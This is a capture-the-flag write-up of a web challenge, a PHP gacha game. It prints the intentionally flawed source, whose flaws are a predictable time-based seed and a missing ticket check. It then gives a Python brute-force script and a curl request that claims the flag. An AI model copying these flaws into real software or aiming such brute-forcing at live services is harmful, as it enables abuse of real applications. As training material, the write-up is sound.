# Fake/Ground Offer

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 76 solves / 250 points
- Author: ozetta
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192850.png)

Can you get 20 UR or SSR cards in the first 20 free gachas? ...

Web: [http://chal-a.hkcert23.pwnable.hk:28137](http://chal-a.hkcert23.pwnable.hk:28137) , [http://chal-b.hkcert23.pwnable.hk:28137](http://chal-b.hkcert23.pwnable.hk:28137)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192909.png)

In here, we can draw something using the "Summon Ticket".

**Let's click on the "Summon 1" button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113193439.png)

When we clicked that button, **it'll send a GET request to `/` with GET parameter `gacha1`, and its value is `Summon 1`.**

After that we'll randomly got 1 UR/SSR/SR/R/N to our inventory.

**How about "Summon 10"?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113193733.png)

Almost the same as "Summon 1", but draw 10 times instead of once.

**In the home page, we can also view the source:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113193857.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113193909.png)

**`index.php`:**
```php
 <?php 
session_start();

if(isset($_GET["-s"])){
    show_source(__FILE__);
    exit();
}

include "secret.php";

if(!isset($_SESSION["balance"])){
    $_SESSION["balance"] = 20;
    $_SESSION["inventory"] = Array("UR" => 0, "SSR" => 0, "SR" => 0, "R" => 0, "N" => 0);
}

if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"]+$_SESSION["inventory"]["SSR"]>=20){
        exit("$flag");
    }else{
        exit('$flag');
    }
}

$gacha_result = "";
$seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed

if(isset($_GET["gacha1"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 1;
        $gacha_result = "You got ".implode(", ",gacha(1,$seed));
    }
}elseif(isset($_GET["gacha10"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 10;
        $gacha_result = "You got ".implode(", ",gacha(10,$seed));
    }
}

//Ultra Secure Seedable Random (USSR) gacha
function gacha($n,$s){
    $out = [];

    for($i=1;$i<=$n;$i++){
        $x = sin($i*$s);
        $r = $x-floor($x);
        $out[] = lookup($r);
    }
    return $out;
}

function lookup($r){
    if($r <= 0.001){
        $_SESSION["inventory"]["UR"] += 1;
        return "UR";
    }elseif($r <= 0.004){
        $_SESSION["inventory"]["SSR"] += 1;
        return "SSR";
    }elseif($r <= 0.009){
        $_SESSION["inventory"]["SR"] += 1;
        return "SR";
    }elseif($r <= 0.016){
        $_SESSION["inventory"]["R"] += 1;
        return "R";
    }else{
        $_SESSION["inventory"]["N"] += 1;
        return "N";
    }
}
?>
<html>
<head>
    <title>Fake/Ground Offer</title>
</head>
<body>
    <!-- This is the best frontend we can provide given the budget provided -->
    <h1>Fake/Ground Offer</h1>
    <p>Welcome, Master. Your ID is <?=session_id();?></p>
    <p>Current Balance: <?=$_SESSION["balance"];?> Summon Ticket(s)</p>
    <p>Current Inventory: <?php print_r($_SESSION["inventory"]);?></p>
    <form><input type=submit name="gacha1" value="Summon 1"></form>
    <form><input type=submit name="gacha10" value="Summon 10"></form>
    <h2><?=$gacha_result;?></h2>
    <hr /><p><a href="?-s">Show Source</a></p>
</body>
</html>
```

Now we can dive deeper into the web application!

After reading the source a little bit, we can see something stands out.

**First, when our inventory's UR + SSR >= 20, we can send a GET request to `/` with GET parameter `sellacc` to get the flag:**
```php
include "secret.php";
[...]
if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"]+$_SESSION["inventory"]["SSR"]>=20){
        exit("$flag");
    }else{
        exit('$flag');
    }
}
[...]
```

If we don't, it just returns string `$flag`.

**Then, we can see how the drawing works:**
```php
[...]
$gacha_result = "";
$seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed

if(isset($_GET["gacha1"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 1;
        $gacha_result = "You got ".implode(", ",gacha(1,$seed));
    }
}elseif(isset($_GET["gacha10"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 10;
        $gacha_result = "You got ".implode(", ",gacha(10,$seed));
    }
}
[...]
```

**When we send a GET request to `/` with GET parameter `gacha1` or `gacha10`, it'll call function `gacha()`:**
```php
[...]
//Ultra Secure Seedable Random (USSR) gacha
function gacha($n,$s){
    $out = [];

    for($i=1;$i<=$n;$i++){
        $x = sin($i*$s);
        $r = $x-floor($x);
        $out[] = lookup($r);
    }
    return $out;
}

function lookup($r){
    if($r <= 0.001){
        $_SESSION["inventory"]["UR"] += 1;
        return "UR";
    }elseif($r <= 0.004){
        $_SESSION["inventory"]["SSR"] += 1;
        return "SSR";
    }elseif($r <= 0.009){
        $_SESSION["inventory"]["SR"] += 1;
        return "SR";
    }elseif($r <= 0.016){
        $_SESSION["inventory"]["R"] += 1;
        return "R";
    }else{
        $_SESSION["inventory"]["N"] += 1;
        return "N";
    }
}
[...]
```

When function `gacha()` is called, it'll calculate the probability based on the `$seed`'s value.

## Exploitation

When I initially trying to solve this challenge, I immediately thought function `gacha()` is vulnerable to race condition. However, there's no sub-state. When we try to draw 1/10 time(s), it'll always reduce our ticket first.

**After fumbling around, I realized that the `$seed` is time-sensitive:**
```php
$seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed
```

Hmm... Maybe every second's drawing result will be the same??

**I also found that we can actually draw 29 times instead of 20 times, as `gacha10` doesn't check we have at least 10 tickets or not.**

**So we can draw 29 times via 9 `gacha1`, and 2 `gacha10`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113195712.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113195729.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113195739.png)

**Hence, since the `$seed` is time-sensitive, we can just brute force it to try to get UR + SSR >= 20.**

**To do so, I'll write a script using Python:**
```python
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from time import sleep
import re

async def main():
    while True:
        # brute force it with 0.3 seconds delay, 
        # so we won't beat the server to death
        sleep(0.3)
        async with aiohttp.ClientSession() as sess:
            for _ in range(9):
                resp = await sess.get(URL_GACHA1)
                response_body = await resp.text()
            for _ in range(2):
                resp = await sess.get(URL_GACHA10)
                response_body = await resp.text()

            soup = BeautifulSoup(response_body, 'html.parser')
            pTags = soup.find_all('p')
            sessionId = pTags[0].text
            inventory = pTags[2].text

            sessionIdMatch = re.search(r'Your ID is ([a-fA-F0-9]+)', sessionId)
            urMatch = re.search(r'\[UR\] => (\d+)', inventory)
            ssrMatch = re.search(r'\[SSR\] => (\d+)', inventory)

            idValue = sessionIdMatch.group(1)
            urValue = int(urMatch.group(1))
            ssrValue = int(ssrMatch.group(1))

            urSSRValue = urValue + ssrValue
            print(f'[*] Trying... Session ID: {idValue}, UR + SSR value: {urSSRValue}', end='\r')
            if urSSRValue >= 20:
                print('\n[+] We got UR + SSR >= 20!!')
                print(f'[+] Session ID: {idValue}')
                print(f'[+] UR value: {urValue}')
                print(f'[+] SSR value: {ssrValue}')
                exit(0)

if __name__ == '__main__':
    URL_GACHA10 = 'http://chal-a.hkcert23.pwnable.hk:28137/?gacha10=blah'
    URL_GACHA1 = 'http://chal-a.hkcert23.pwnable.hk:28137/?gacha1=blah'

    asyncio.run(main())
```

**After running it for sometimes, you might get lucky to get UR + SSR >= 20:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Fake-Ground-Offer)-[2023.11.13|20:18:31(HKT)]
└> python3 solve.py
[*] Trying... Session ID: 5117fa47d437f27d8ff9094d5ebde132, UR + SSR value: 29
[+] We got UR + SSR >= 20!!
[+] Session ID: 5117fa47d437f27d8ff9094d5ebde132
[+] UR value: 15
[+] SSR value: 14
```

**Finally, we can send a GET request to `/` with GET parameter `sellacc` and the PHP session ID to get the flag!**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Fake-Ground-Offer)-[2023.11.13|20:23:39(HKT)]
└> curl http://chal-a.hkcert23.pwnable.hk:28137/?sellacc= --cookie "PHPSESSID=5117fa47d437f27d8ff9094d5ebde132" 
hkcert23{USSR_stands_for_Union_of_Sov...oh_no_we_cannot_talk_about_that_in_here}
```

- **Flag: `hkcert23{USSR_stands_for_Union_of_Sov...oh_no_we_cannot_talk_about_that_in_here}`**

## Conclusion

What we've learned:

1. Exploiting flawed gacha system